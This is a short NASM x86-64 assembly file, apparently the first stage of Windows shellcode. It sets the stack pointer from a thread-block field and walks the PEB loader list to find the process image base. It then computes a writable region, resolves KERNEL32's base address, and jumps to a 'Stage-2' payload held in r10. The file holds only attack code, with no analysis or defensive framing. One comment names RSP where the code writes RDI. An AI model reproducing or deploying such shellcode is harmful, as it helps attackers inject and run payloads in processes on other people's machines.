    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    dd 0x11111111

    xor r8, r8
    mov r8b, 0x10
    mov r11, [GS:r8]        
    mov rsp, r11
    add r8b, 0x50
    mov r11, [GS:r8]        ; R11 = PEB
    
    mov r11, [r11 + 0x18]   ; R11 = _PEB_LDR_DATA
    mov r11, [r11 + 0x10]   ; R11 = _LDR_DATA_TABLE_ENTRY InLoadOrder[0] (process)
    mov rdi, [r11 + 0x30]   ; RSP = DllBase (process)

    mov r8b, 0x88
    shl r8w, 0x8
    add rdi, r8             ; RDI = Process Writeable

    mov r11, [r11]          ; R11 = _LDR_DATA_TABLE_ENTRY InLoadOrder[1] (ntdll)
    mov r11, [r11]          ; R11 = _LDR_DATA_TABLE_ENTRY InLoadOrder[2] (KERNEL32)
    mov rcx, [r11 + 0x30]   ; RCX = DllBase (KERNEL32)

    jmp r10                 ; Stage-2

